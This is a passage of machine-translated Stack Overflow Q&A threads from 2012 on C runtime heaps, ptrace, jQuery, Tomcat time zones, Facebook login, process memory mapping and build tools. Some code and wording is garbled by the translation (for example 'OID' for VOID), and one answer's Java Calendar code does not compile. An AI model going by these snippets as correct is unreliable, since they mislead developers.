当您的 DLL 和 EXE 都静态链接到 C 运行时，这两个运行时根本不知道彼此。因此，EXE 和 DLL 都有自己的运行时副本、自己的堆和堆元数据。双方都不知道其他元数据，并且在释放内存时没有安全的方法来更新数据。你最终会得到不稳定的元数据，事情最终会失败（如果你很幸运，它会立即失败）。

这意味着您的进程中至少有两个堆，每个堆都有自己的规则和元数据。EXE 无法知道 DLL 分配内存的确切方式，因此无法释放它。

至于为什么当一切都是动态链接时你可以共享一个堆，这很容易，进程中只有一个 C 运行时 DLL 的副本，所以如果每个 DLL 链接到它，它们都将调用相同的代码相同的元数据。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-08-31T12:51:18.773

您不能从一个分配器分配内存并用另一个分配器释放它。不同的分配器使用不同的内部实现，并且将内存块分配给未分配它的分配器的结果是不可预测的。

因此，除非您知道两段代码使用相同的分配器这一事实，否则您不能在一段代码中分配内存并在另一段中释放它。通常的解决方案是确保同一个单元分配和释放内存。在您的示例中，DLL 可以提供一个“免费”函数，主代码可以调用该函数，而不是调用它自己的`free`函数来释放它自己的分配器。

所以改为这样做：

```
OID EXEFunc() {
    PVOID pv = DLLFunc();
    // Access the storage pointed to by pv...
    // Assumes that pv is in EXE's C/C++ run-time heap
    DLLFreeFunc(pv);
}

...

PVOID DLLFunc() {
    // Allocate block from DLL's C/C++ run-time heap
    return(malloc(100));
}

DLLFreeFunc(PVOID x) {
    free(x);
} 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-31T17:23:28.723

在 Linux 上，程序使用 brk 和 sbrk 系统调用从内核请求额外的数据页。sbrk 返回指向程序可以使用的数据段的地址。

malloc 和 free 通过将 brk 和 sbrk 返回的数据段变成堆来使用它。堆是当前进程空间中的一大块内存，可以根据需要请求和返回小块内存。重要的是要注意许多对 malloc 和 free 的调用不会进行系统调用。

现在，当 malloc 和 free 想要使用堆时，他们需要获取指向堆的指针。此指针存储在称为静态数据的单独数据段中，并在应用程序加载时分配。为了确保不同的 DLL（或 linux 上的共享库）不会相互冲突，每个 DLL 都有自己的静态数据部分。

现在让我们假设 dll 和可执行文件都静态链接到它们自己的库。在这种情况下，dll 和可执行文件将具有指向不同堆的指针，并且在这种情况下，dll 和可执行文件都必须释放自己的内存。

然而，在 linux 上，dll 和可执行文件都将通过一个通用 DLL（linux 上的 libc.so）访问 malloc 和 free。在这种情况下，由于 dll 和可执行文件都有效地访问了 libc 的堆，因此可执行文件可以安全地释放 dll 分配的内存。

无论如何，最好让 dll 提供自己的免费功能。如果没有其他文件表明需要释放 DLLFunc 返回的指针，则此为。

我想这在 Windows 上也是如此。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-08-31T12:52:02.443

代码严重依赖于 和 的`malloc`实现`free`。一个好的实施没有问题，一个糟糕的实施确实会失败。`malloc`创建and的工作 DLL 实现肯定更容易`free`，但在静态库中这样做远非不可能。

一个简单的例子是一个静态库，它将调用直接转发到`GlobalAlloc`and `GlobalFree`。

# ptrace - 是否可以使用 PTRACE_SETREGS 来更改进程的执行顺序？

> ID：12215686
> 
> 赞同：1
> 
> 时间：2012-08-31T12:47:01.937
> 
> 标签：ptrace

是否可以使用 PTRACE_SETREGS 来更改进程的执行顺序？我在进程执行的某个点保存进程寄存器文件，我想稍后使用它来设置进程的当前寄存器文件（此时再次重复执行）。下面是我尝试使用的代码，但它不起作用。有人可以向我解释它有什么问题或我对 ptrace 有什么误解吗？

```
#include<stdio.h>
#include<sys/ptrace.h>
#include<sys/types.h>
#include<unistd.h>
#include<sys/reg.h>
#include<sys/user.h>
#include<sys/syscall.h>
#include<string.h>
#include<stdlib.h>

int main(int argc, char *argv[])
{
pid_t app1;
int status;
int entry =1; //used to check the system call entry or exit
struct user_regs_struct app1_regs, prev_sys_regs;
int flag=1;
long app1_syscall;
if(argc < 2)
{
printf("Usage: %s <pid to be traced>\n", argv[0], argv[1]);
exit(1);

}
app1 = atoi(argv[1]);
ptrace(PTRACE_ATTACH, app1, NULL, NULL);

while (1){
waitpid(app1,&status,0);
app1_syscall = ptrace(PTRACE_PEEKUSER, app1, 4 * ORIG_EAX, NULL);
ptrace(PTRACE_GETREGS, app1, NULL, &app1_regs); 
if(entry){//system call entry
entry = 0;
 printf("Instruction Pointer:0x%.8lx, Stack Pointer: 0x%.8lx,  orig_eax: 0x%.8lx, eax: 0x%.8lx, ebx: 0x%.8lx, ecx: 0x%.8lx, edx: 0x%.8lx, esi: 0x%.8lx, edi:0x%.8lx,ebp:0x%.8lx\n",app1_regs.eip, app1_regs.esp, app1_regs.orig_eax, app1_regs.eax, app1_regs.ebx, app1_regs.ecx, app1_regs.edx, app1_regs.esi, app1_regs.edi, app1_regs.ebp);

if(app1_syscall == SYS_write && flag ==1){
flag=0; //I want to do this only once 
//here I'm setting the current registers of the process with the previous one to repeat the execution from previous point
ptrace(PTRACE_SETREGS, app1, NULL, &prev_sys_regs);
}
}
else{ //system call exit
entry = 1;
if (flag ==1)
prev_sys_regs = app1_regs;
if(WIFEXITED(status))
return 0;
}

ptrace(PTRACE_SYSCALL, app1, NULL, NULL);
}

return 0;

} 
```

# joomla - joomla中TinyMCE的图像映射插件不起作用

> ID：12215689
> 
> 赞同：1
> 
> 时间：2012-08-31T12:47:12.503
> 
> 标签：joomla, tinymce, imagemap

我已经在 J​​oomla 2.5 中安装了 Tiny MCE 的图像映射插件。

它似乎在后端工作正常。我在文章中插入了一张图片，并使用插件按钮创建了图片地图标签。图像地图的标签似乎是正确的

但是当我在前端浏览时，图像映射似乎没有效果。Firebug 将线图像映射区域显示为禁用。

```
<p>
<img border="0" title="Ground Floor" src="/images/ground-floor.jpg">
<map id="imgmap2012831174531" name="imgmap2012831174531">

<area target="_blank" href="/mywebsolutions.co.in" coords="212,934,294,1058"  alt="MYWEB SOLUTIONS" shape="rect">
</map>
The line with
<area target..... appears faded.
</p> 
```

我已经尝试了一切，包括安装 jquery 无冲突插件。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-31T13:34:07.390

```
<object data="images/sampledata/fruitshop/map.png" usemap="#map" border="0">
</object>
<map id="map" name="Map"> 
```

*   地图 id 应与`usemap`id 相同。
*   您必须在对象标签中给出 src。然后它会工作正常..

祝一切顺利....

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-07-19T08:55:31.070

区域标签必须正确关闭，例如，

`<area target="_blank" href="/mywebsolutions.co.in" coords="212,934,294,1058" alt="MYWEB SOLUTIONS" shape="rect" />`

或者

`<area target="_blank" href="/mywebsolutions.co.in" coords="212,934,294,1058" alt="MYWEB SOLUTIONS" shape="rect"></area>`

还有一件事你不应该使用 TineMCE 这个功能，在站点设置中选择 CodeMirror 或 None，它肯定会工作。保存特定帖子后，您可以改回tineMCE。记住以后不要在 TinyMCE 上编辑相同的内容，否则它将删除您的功能。

# iphone - UIApplication 和 _powerDown 方法...在哪里？

> ID：12215694
> 
> 赞同：0
> 
> 时间：2012-08-31T12:47:41.280
> 
> 标签：iphone, tweak

我在 github 上看到一个项目，开发人员使用方法 _powerDown 关闭 iPhone 或 relaunchSpringBoard 重新启动它。代码行是这样的：

```
[[UIApplication SharedApplication]_powerDown]; 
```

但我在 UIApplication 的类引用上搜索这个方法，但我没有找到它......有人可以帮我吗？

谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-31T13:51:47.393

我不确定这是否真的是一种方法`UIApplication`，但如果是，它绝对是一种私有方法。因此它没有在官方文档中列出，你不应该使用它。

# jquery - JQuery UI 按钮，在 jQuery UI 选项卡内来回切换后不起作用

> ID：12215697
> 
> 赞同：1
> 
> 时间：2012-08-31T12:47:46.220
> 
> 标签：jquery, jquery-ui, jquery-ui-dialog, jquery-ui-tabs

初学者。我有一些选项卡，每个选项卡的内容都是从文本文件动态加载的。因此，单击每个选项卡，为该选项卡加载带有内容的文本文件。

```
$('#thisMainTabs').tabs({selected:0});

<div id='thisMainTabs'>
<ul>
<li><a href='/scripts/thisMainTabs1.txt'>Tab 1 Content</a></li>
<li><a href='/scripts/thisMainTabs2.txt'>Tab 2 Content</a></li>
<li><a href='/scripts/thisMainTabs3.txt'>Tab 3 Content</a></li>
<li><a href='/scripts/thisMainTabs4.txt'>Tab 4 Content</a></li>
<li><a href='/scripts/thisMainTabs5.txt'>Tab 5 Content</a></li>
</ul>
</div> 
```

我想尽可能基本。在其中一些选项卡中，我有 jQuery 按钮，它们也是非常基本的

文件内准备好：

```
$('#btnNumber1').button({icons: {primary: 'ui-icon-circle-plus' secondardy: null} });

$('#btnNumber1').click(function () {
     alert('working');
});

<div id='btnNumber1'>add new<div> 
```

所以作为一个例子，我只是使用了这些警报，但实际上这些东西打开了对话框（是的 jquery 对话框也是如此）。似乎正在发生的事情是，第一次选择的每个选项卡都会呈现按钮并且它将起作用，但是如果我返回选项卡，按钮就在那里，但单击时不执行任何操作。不确定是对话框还是按钮？但一切都是第一次通过。

我是新手，非常感谢您对此的任何帮助。谢谢！

编辑：应该再澄清一些事情。道歉。

所以上面的 .tabs() 和 #thisMainTabs 是主页面内容中唯一的东西。除了默认的选项卡内容......真的只有文字。在其他每个选项卡中（大约还有 5 个）我有指向文本文件链接的 href。这些文本文件中的每一个都包含该选项卡内容（标记、js、css 等），并且在每个文件中我都有一个 $(document).ready.... 这有点奇怪，但其他一切似乎去工作？？我将再次声称初学者:)。所以我有手风琴，我有按钮，我有对话框（所有 jQ），一切都工作正常，直到我注意到上述行为。如果我第一次选择每个选项卡，内容就会加载，按钮就在那里，我点击它，它就可以工作（大多数是对话框）。在选项卡之间切换，只要第一次单击该选项卡，它们都可以工作。

但是，如果我回到一个选项卡，按钮就在那里，但什么也不做。

我上面的例子是我如何使用所有将它们视为按钮的按钮并设置点击功能的示例。这些中的每一个都在文档中为每个选项卡的每个文本文件准备好。我对所有 ID 进行了两次和三次检查，以确保一切都是独一无二的；使用 ID 到了极端，以确保不会发生这种情况，因为它有很多脚本。反正对我来说......

更新：不确定是我遇到问题的按钮还是对话框，上述问题似乎与那些触发对话框的按钮无关。还是一样的，第一次还好，第二次就不行了。向某些附加警报，并且效果很好。

对话框是这样构建的（也完全在文本文件中，并且在该文本文件的文档准备就绪上）。

```
$('#thisDialogDiv').dialog({ 
                        resizable:false, 
                        width:200, 
                        modal: true, 
                        autoOpen: false, 
                        buttons: { 
                        "Ok": function() { $(this).dialog("close"); } } 
                        }); //not bothering with buttons

<div id="thisDialogDiv">
<h3>Here is the Title</h3>
<p>Here is some content on the dialog</p>
</div> 
```

在上面引用的按钮上调用这样的对话框

```
$('#btnNumber1').click(function () {
    $('#thisDialogDiv').dialog("open");
}); 
```

这基本上是每个实例的......我猜很基本。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-31T12:49:18.117

我想我现在更好地理解了你的问题。

每个选项卡中都有`div`一个`id="btnNumber1"`。但是这些选项卡都存在于同一个窗口（或更准确地说是框架）中，并且 html`id`在给定文档中必须是唯一的。

因此，您需要`btnNumber2`在第二个选项卡、`btnNumber3`第三个选项卡等中提供按钮 id =。它仅适用于您的第一个选项卡的原因是您的所有代码都是找到 DOM 中存在的第一个。

编辑：

贾斯汀，如果您在父文档中进行委托绑定怎么办？例如：

```
$('#thisMainTabs').on('click', '#btnNumber1', function() { alert('Button 1 clicked'); }); 
```

那么这会 100% 触发吗？我并不是说这是解决方案...我认为您将相关代码与内容保持在一起很好...否则它会成为维护的噩梦，但我觉得按需发生的事情加载....也许在`.ready()`第一次加载选项卡后没有触发？不知道，制作 WAG ;)

# jquery - 使用英寸的 jquery ui 滑块

> ID：12215700
> 
> 赞同：2
> 
> 时间：2012-08-31T12:47:57.427
> 
> 标签：jquery, html, jquery-ui, jquery-ui-slider

![在此处输入图像描述](../Images/e99d0922a13f4ef04420aba42f578152.png)

我需要使用带有英寸的 Jquery UI 滑块。

我知道如何让滑块使用标准数字，例如：0 到 100，但我不确定如何让英寸工作。

我认为需要额外的计算 - 也许。

关于如何让这个工作的任何建议？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-08-31T12:59:23.980

下面是一些可以帮助您入门的内容：

```
function toFeet(n) {
    return Math.floor(n / 12) + "'" + (n % 12) + '"';
}

$(function () {
    $("#slider").slider({
        min: 55,
        max: 85,
        values: [60, 80],
        range: true,
        slide: function(event, ui) {
            // ui.values[0] and ui.values[1] are the slider handle values.
            $("#result .min").html(toFeet(ui.values[0]));
            $("#result .max").html(toFeet(ui.values[1]));
        }
    });
});​ 
```

您需要做的就是将滑块的最小值和最大值转换为英寸。滑动滑块时，可以通过简单的转换来显示英尺和英寸（这里在`toFeet`方法中实现）。

**示例：http:** [//jsfiddle.net/andrewwhitaker/4extL/57/](http://jsfiddle.net/andrewwhitaker/4extL/57/)

# java - 如何使用阻塞队列在后台处理相机源？

> ID：12215702
> 
> 赞同：1
> 
> 时间：2012-08-31T12:48:08.043
> 
> 标签：java, android, multithreading, thread-safety, blockingqueue

在处理“面部检测”的 android 应用程序中的相机馈送时，我遇到了一个问题。

**我正在尝试做的事情：**

-我有一个活动，它在 SurfaceView（UI 线程）中连续显示手机摄像头馈送

- 为了避免性能问题，我在顶部放置了一个表面视图，以使用 OpenCv 在检测到的面上绘制矩形（这是在线程中运行，比如线程 2）

- 我正在尝试将 Direct feed 图像的副本传递给 Thread2，以便线程 2 可以进行检测并在覆盖表面视图上绘图

**我现在在哪里：**

-我正在考虑使用带有阻塞队列的线程，以便 UIthread 可以使用 BlockingQueue.add(..) 将图像放入 BlockingQueue 中，并且 Thread2 可以在 BlockingQ 中获取图像，对其进行处理并在后台检测人脸

**条件：** 我希望UI线程，不要等待，以便在显示器上看到统一的提要。它只需要放置图像，然后无需等待其他任何东西，它就可以去获取下一个提要并重复该过程

目前我正在使用一个实现 Runnable 接口的新类，它有两个方法 putImage(bitmap) 和 getImage() 使用blockingQueue.putImage()放置和获取图像由UIthread调用，getImage()由thread2调用

**问题：** 当我继续将图像放入阻塞队列时，Thread2 无法访问blockingQ（Itsblocked）并且由于UI线程应该不间断地运行，我不能在主线程中调用wait（）或sleep（）。

Thread2 有什么方法可以在不阻塞 MainThread 的情况下从队列中获取这些图像？？？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-31T13:10:23.967

你这里有一个典型的生产者-消费者问题。你的生产者应该是主线程。消费者是检测人脸的人。消费者必须在不同的线程中运行。不需要单独的线程来处理队列，它可以在生产者和消费者可以访问的任何地方。
这样，除非您的队列是有界的，否则不应该有任何阻塞。默认的[LinkedBlockingQueue](http://docs.oracle.com/javase/1.5.0/docs/api/index.html?java/util/concurrent/LinkedBlockingQueue.html)实际上是无界的。
要在不阻塞的情况下访问准备好的产品，您可以执行以下操作： 声明另一个队列来保存已完成任务的结果。面部处理器将是它的生产者，主线程将是消费者。让处理器随时填充它，主线程定期检查它是否有准备好的产品。如果它发现结果队列不为空，你可以通知用户或者做任何你想做的事情。

# javascript - 实现 Js 小部件：依靠 $_SERVER['HTTP_REFERER'] 变量检查主机域是否安全？

> ID：12215705
> 
> 赞同：0
> 
> 时间：2012-08-31T12:48:23.393
> 
> 标签：javascript, php, widget, cross-domain

我正在实现一个 Js 小部件，带有源代码的小部件在 domain1.com 上，小部件（查看器）的主机在 domain2.com

在 domain1.com 上，我使用 PHP 作为服务器脚本语言。

我需要检查是否允许小部件托管域从提供小部件服务的 domain1.com 获得答案。

我正在考虑执行这样的操作：

在 domain2.com 上：

```
<html>
    <head></head>
    <body>
        <div id="widget-container"></div>        
    </body>
    <script src="http://domain1.com/widget/viewer.php" type="text/javascript"></script>
</html> 
```

在 domain1.com 上：

```
<?php 
    if(in_array($_SERVER['HTTP_REFERER'], $allowedDomains)){
       /* echo all widget goodness*/
    }else{
        die('you\'ve not permission to get this service');
    }
?> 
```

检查`$_SERVER['HTTP_REFERER']`变量以授予主机域访问我的小部件是否可靠？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-04T00:28:21.700

不，不安全，referer可以随意篡改。

参见[引用控制](https://chrome.google.com/webstore/detail/hnkcfpcejkafcihlgbojoidoihckciin)

事实上，请求中的任何内容都可以伪造。

您应该寻找其他东西来保护您的小部件，例如 https+sessions。

# java - Tomcat 挂起调用 TimeZone

> ID：12215708
> 
> 赞同：4
> 
> 时间：2012-08-31T12:48:50.187
> 
> 标签：java, timezone, timezone-offset

我有这个问题正在降低生产。在 AWS/Ubuntu/Tomcat 堆栈中，CPU 运行的 Tomcat 正在跳跃到 100%，当我得到一个线程转储时，这段代码总是在完全相同的地方阻塞。（所有其他人都被锁定并等待。）

```
"TP-Processor6" daemon prio=10 tid=0x0000000041ec2800 nid=0x41c4 runnable [0x00007f70194b5000]
  java.lang.Thread.State: RUNNABLE
    at sun.util.calendar.ZoneInfo.getTransitionIndex(ZoneInfo.java:322)
    at sun.util.calendar.ZoneInfo.getOffsets(ZoneInfo.java:248)
    at sun.util.calendar.ZoneInfo.getOffsets(ZoneInfo.java:225)
    at java.util.GregorianCalendar.computeFields(GregorianCalendar.java:2024)
    at java.util.GregorianCalendar.computeFields(GregorianCalendar.java:1996)
    at java.util.Calendar.setTimeInMillis(Calendar.java:1109)
    at java.util.GregorianCalendar.<init>(GregorianCalendar.java:576)
    at java.util.Calendar.createCalendar(Calendar.java:1011)
    at java.util.Calendar.getInstance(Calendar.java:948)
    at com.xxx.core.util.DateUtil.modifyDate(DateUtil.java:385)
    at com.xxx.core.util.DateUtil.getDayDate(DateUtil.java:563)
    at com.xxx.core.util.DateUtil.getDayDate(DateUtil.java:573)
    at com.xxx.core.util.DateUtil.getDayDate(DateUtil.java:569)
    at com.xxx.core.util.DateUtil.splitByDays(DateUtil.java:496)
    at com.xxx.core.util.DateUtil.splitDateIntervalByIntervals(DateUtil.java:474)
    at com.xxx.core.util.DateUtil.splitDateIntervalByIntervals(DateUtil.java:436) 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-01T10:32:50.473

围绕事物进行一些更好的日志记录，以弄清楚这里发生了什么。

确保您的实例指定了正确的编码和区域设置——系统、tomcat 容器、应用程序。以格林威治标准时间为标准并尝试：

```
Calendar.getInstance ("GMT-0", Locale.US); // verify inputs 
```

如果您正在获取日历的实例，为什么要明确地重新设置日期？为什么不直接创建一个新日历？然后，您将实例化一个新日历：

```
Calendar cal = new Calendar (TimeZone zone, Locale aLocale); // new 
cal.setTimeZone("GMT-0"); 
cal.setTimeInMillis(System.currentTimeMillis ()); 
```

Calendar 和 Date 对象在 Java 中相对具有可塑性，因此您可以更改它们的功能。我猜想环境变量或容器中可能有一些设置不正确，例如本地或编码与日历实例尝试的内容冲突。尝试明确指定所有内容。

这是我最好的直觉。

# java - 具有服务器端访问用户数据的 Facebook 登录插件

> ID：12215709
> 
> 赞同：2
> 
> 时间：2012-08-31T12:48:52.090
> 
> 标签：java, facebook, plugins, login

我有几件事情要做，例如使用 -

```
 FB.login(function(response) {
   if (response.authResponse) {
     console.log('Welcome!  Fetching your information.... ');
     FB.api('/me', function(response) {
       console.log('Good to see you, ' + response.name + '.');
     });
   } else {
     console.log('User cancelled login or did not fully authorize.');
   }
 }); 
```

我能够获取用户、姓名、用户 ID 等的所有详细信息。

我的问题是如何“安全地”将所有这些信息发送到服务器。我不希望这些信息在发送到服务器的途中被嗅探。我使用 JAVA(Servet/JSP) 语言，请帮助我。我希望有某种方式，如注册插件，Facebook 在 redirect_url 链接上发送所有信息。

问候， Jagpreet Singh

* * *

编辑：如果有人需要 Java 代码 -

```
 // it is important to enable url-safe mode for Base64 encoder
    Base64 base64 = new Base64(true);

    // split request into signature and data
    String[] signedRequest = request.getParameter("signed_request").split("\\.", 2);

    logger.info("Received signed_request = " + Arrays.toString(signedRequest));

    // parse signature
    String sig = new String(base64.decode(signedRequest[0].getBytes("UTF-8")));

    // parse data and convert to JSON object
    JSONObject data = (JSONObject) JSONSerializer.toJSON(new String(base64.decode(signedRequest[1].getBytes("UTF-8"))));

    logger.warn("JSON Value = " + data);

    // check signature algorithm
    if (!"HMAC-SHA256".equals(data.getString("algorithm"))) {
        // unknown algorithm is used
        logger.error("HMAC-SHA256 Algo? = false, returning ERROR");
        return ERROR;
    } else {
        logger.error("HMAC-SHA256 Algo? = true, Checking if data is signed correctly...");
    }

    // check if data is signed correctly
    if (!hmacSHA256(signedRequest[1], fbSecretKey).equals(sig)) {
        // signature is not correct, possibly the data was tampered with
        logger.warn("DATA signed correctly? = false, returning ERROR");
        return ERROR;
    } else {
        logger.warn("DATA signed correctly? = true, checking if user has authorized the APP...");
    }

    // check if user authorized the APP (FACEBOOK User)
    if (!data.has("user_id") || !data.has("oauth_token")) {
        // this is guest, create authorization url that will be passed
        // to javascript
        // note that redirect_uri (page the user will be forwarded to
        // after authorization) is set to fbCanvasUrl
        logger.warn("User has authorized the APP? = false, returning ERROR");
        return ERROR;
    } else {
        logger.warn("User has authorized the APP? = true, Performing User Registration...");

        // this is authorized user, get their info from Graph API using
        // received access token

        // String accessToken = data.getString("oauth_token");
        // FacebookClient facebookClient = new
        // DefaultFacebookClient(accessToken);
        // User user = facebookClient.fetchObject("me", User.class);
    } 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-31T13:57:37.390

`signed_request`当您使用客户端方法进行身份验证时，Facebook 会发送一个参数。您可以将其传递给您的服务器，对其进行身份验证，然后将其解包以获取您需要的信息。它使用您的应用程序机密加密，因此您可以确保它是安全的。

有关详细信息，请参阅[signed_request 文档](https://developers.facebook.com/docs/authentication/signed_request/)。

# vim - 如何使用 vim 对 .html 文件进行无效的语法检查

> ID：12215710
> 
> 赞同：5
> 
> 时间：2012-08-31T12:48:51.617
> 
> 标签：vim, syntastic

你知道如何检查 HTML 文件中的无效语法吗？我正在使用带有合成插件 vim 插件的 ember.js，它产生的警告让我感到困惑。

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2012-08-31T13:41:24.367

该代码无效，因为`<script>`不应包含任何其他 HTML 标记。

`:help syntastic`显示如何禁用给定文件类型的语法检查：

```
let g:syntastic_mode_map={ 'mode': 'active',
                     \ 'active_filetypes': [],
                     \ 'passive_filetypes': ['html'] } 
```

# c - 读取进程的起始地址和长度（虚拟内存映射）

> ID：12215719
> 
> 赞同：0
> 
> 时间：2012-08-31T12:49:14.930
> 
> 标签：c, winapi

从[这里开始](https://stackoverflow.com/questions/12215299/reading-a-process-memory#comment16363546_12215299)

我需要知道如何读取进程的起始地址和长度（虚拟内存映射）。

我想映射一个进程内存。我想读取进程内存的值并将值写入它们。

我很好奇像 Cheat-O'matic (cheat-o-matic.softonic.com.br) 这样的程序是如何工作的。我想到的第一件事是该进程将被加载到一个连续的内存位置。但这似乎不对。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-31T12:58:54.977

重复调用[VirtualQueryEx](http://msdn.microsoft.com/en-us/library/windows/desktop/aa366907%28v=vs.85%29.aspx)，从地址零开始，每次在传递给它`RegionSize`的结构成员中获得的值都增加。`MEMORY_BASIC_INFORMATION`为了获得有意义的地图，显然应该暂停该过程。

尽管如此，即使你得到了这个内存映射，我也不确定你能用它做什么：除非你知道（通过其他方式）你正在访问的进程的内部，你所知道的只是你可以阅读或在不触发访问冲突的情况下写入，而不是其内容的含义。您应该真正澄清您要实现的目标，Read/WriteProcessMemory 通常不是“正常”问题的解决方案。

# grails - Gradle 搜索 zip 而不是 jar

> ID：12215721
> 
> 赞同：7
> 
> 时间：2012-08-31T12:49:20.420
> 
> 标签：grails, gradle, grails-2.0

我想在我的（Grails）项目中包含 Apache commons-math 3.0。所以我将以下内容放入我的依赖项中：

```
compile "org.apache.commons:commons-math3:3.0" 
```

它位于中央 maven 存储库中，请参阅[http://central.maven.org/maven2/org/apache/commons/commons-math3/3.0/](http://central.maven.org/maven2/org/apache/commons/commons-math3/3.0/)

Gradle 给了我错误

```
 ::::::::::::::::::::::::::::::::::::::::::::::

    ::              FAILED DOWNLOADS            ::

    :: ^ see resolution messages for details  ^ ::

    ::::::::::::::::::::::::::::::::::::::::::::::

    :: org.apache.commons#commons-math3;3.0!commons-math3.zip

    :::::::::::::::::::::::::::::::::::::::::::::: 
```

其中包括：

```
==== mavenCentral: tried

  http://repo1.maven.org/maven2/org/apache/commons/commons-math3/3.0/commons-math3-3.0.zip 
```

所以它似乎在寻找正确的地方，但为什么它在寻找拉链而不是罐子？Gradle doco 说 jar 是默认搜索的东西。我什至尝试使用带有 @ 符号的“仅工件表示法”来获取 jar（如[http://gradle.org/docs/current/userguide/dependency_management.html](http://gradle.org/docs/current/userguide/dependency_management.html)中所述），但它仍然只搜索 zip。

* * *

## 回答 #1

> 赞同：24
> 
> 时间：2012-09-01T03:58:29.807

如果您使用 Grails`BuildConfig.groovy`进行解析，则有两个依赖解析块，一个`dependencies`块和一个`plugins`块。确保您的声明在`dependencies`块内。如果它不小心被放置在`plugins`块中，它将寻找一个打包的插件，这些插件被打包为一个`.zip`文件。

# jqgrid - jqgrid dataevent不会触发下拉列表中的动态加载数据

> ID：12215728
> 
> 赞同：2
> 
> 时间：2012-08-31T12:50:00.197
> 
> 标签：jqgrid

这里是Size的多选，它是根据样式值填充的。最初它是空的。

当我更改任何大小的选择时，不会触发 dataevent 更改。我在这里做错了什么？

```
 <script language="javascript" type="text/javascript">
function setHiddensizes(e)
{
    var sizesId = $(e.target).val();
    var row = $(e.target).closest('tr.jqgrow');
    var rowId = row.attr('id');
    $("#" + rowId +"_sizesId").val(sizesId);
}
            var i = 1;
            var lastSelection=0;
            $(function()
            {
                 $("#curruntppeGridgrid").jqGrid({
                        url:'getcostperformancecurreuntPPE',
                        datatype: "json",
                        jsonReader:{"repeatitems":false,unformat:Unformat_Select},
                        colNames:['Action','surveyId','applicationId','CategoryId','ManufacturerId','StyleId','UOMId','averagelifetimeselectId','sizesId','vp2Id','gridid',
                                    'recordId','Category','Manufacturer','Style','UOM','Count','Unit','Qty','Cost','Sizes','Annual Cost','VP2'], 
                        colModel:[{name:'id',index:'id',hidden:true,key:true},
                                    {name:'surveyId',index:'surveyId',hidden:true,editable:true},
                                    {name:'applicationId',index:'applicationId',hidden:true,editable:true},
                                    {name:'categoryId',index:'categoryId',hidden:true,editable:true},
                                    {name:'manufacturerId',index:'manufacturerId',hidden:true,editable:true},
                                    {name:'styleId',index:'styleId',hidden:true,editable:true},
                                    {name:'uomId',index:'uomId',hidden:true,editable:true},
                                    {name:'averagelifetimeselectId',index:'averagelifetimeselectId',hidden:true,editable:true},
                                    {name:'sizesId',index:'sizesId',hidden:true,editable:true},
                                    {name:'vp2Id',index:'vp2Id',hidden:true,editable:true},
                                    {name:'gridId',index:'gridId',hidden:true,editable:true,editoptions:{defaultValue:'current'}},
                                    {name:'recordId',index:'recordId',hidden:true,editable:true},

                                    {name:'category',index:'category',align:'center',editable: true, hidden: false, edittype: 'select',
                                   editoptions: { multiple: false, value: eval('(' + catList + ')'),
                                   dataEvents: [{
                                                type: 'change',
                                                fn:function(e){
                                                loadStyle(e);
                                                }}]},
                                   editrules: {required:false,custom:true,custom_func:categorycheck}
                                   },
                                   {name:'manufacturer',index:'manufacturer',align:'center', editable: true, hidden: false, edittype: 'select',
                                   editoptions: { value:eval('(' + manufList + ')'),
                                   dataEvents: [{
                                                type: 'change',
                                                fn:function(e){
                                                loadStyle(e);
                                                }}]},
                                   editrules: {required:false}
                                     },
                                   {name:'style',index:'style',align:'center',editable: true, hidden: false, edittype: 'select',
                                   editoptions: { multiple: false, value: eval('('+styleList+')'),
                                   dataInit: function (elem) {
                                   var v = $(elem).val();
                                    if(v!='')
                                    {
                                        var data = loadSizes(elem);
                                        jQuery('#curruntppeGridgrid').setColProp('sizes',{editoptions:{multiple:true,value:data}});
                                        var data1 = loadUom(elem);
                                        jQuery('#curruntppeGridgrid').setColProp('uom',{editoptions:{value:data1}});                        
                                    }
                                    else
                                        {
                                            jQuery('#curruntppeGridgrid').setColProp('sizes',{editoptions:{multiple:true,value:{}}});
                                            jQuery('#curruntppeGridgrid').setColProp('uom',{editoptions:{value:{}}}); 
                                        }
                                            },
                                    dataEvents: [{
                                                type: 'change',
                                                fn:function(e){
                                                loadCategoryAndManufacturer(e);
                                                }}]

                                   },
                                   editrules: { required: true}},
                                   {name:'uom',index:'uom',align:'center', editable: true, hidden: false, edittype: 'select',
                                   editoptions: { multiple: false, value:eval('(' + uomfList + ')'),
                                   dataEvents: [{
                                                type: 'change',
                                                fn:function(e){
                                                setHiddenUom(e);
                                                }}]
                                             },
                                   editrules: { required: false }},

                                   {name:'averagelifetime',index:'averagelifetime',editable:true,align:'center',sortable:false,editrules:{integer:true},
                                   editoptions:{class:'validate[custom[numbersOnly]]',
                                    dataEvents: [{
                                                type: 'click',
                                                fn:function(e){
                                                $('#formQuickSurvey').validationEngine({promptPosition:'bottomLeft',validationEventTrigger:'keyup'});
                                                }
                                                },
                                                {
                                                type: 'change',
                                                fn:function(e){
                                                setQty(e);
                                                }
                                                }
                                                ]}
                                   },

                                   {name:'averagelifetimeselect',index:'averagelifetimeselect',editable:true,align:'center',edittype: 'select',
                                   editoptions:{ multiple: false, value: eval('(' + avglifetimelist + ')'),
                                   dataInit: function (elem) {
                                                                var v = $(elem).val();
                                                                if(v!=''){
                                                                        jQuery('#curruntppeGridgrid').setColProp('averagelifetimeselectId', { editoptions: { defaultValue:v}} );
                                                                    }
                                                                },
                                   dataEvents: [{
                                                type: 'change',
                                                fn:function(e){
                                                setHiddenaveragelifetimeselect(e);
                                                setQty(e);
                                                }}]
                                                },
                                   editrules: { required: false }},

                                   {name:'qty',index:'qty',align:'center',editable:true,editrules:{integer:true},
                                   editoptions:{class:'validate[custom[numbersOnly]]',
                                    dataEvents: [{
                                                type: 'change',
                                                fn:function(e){
                                                calculateannualCost(e);
                                                }
                                                },{
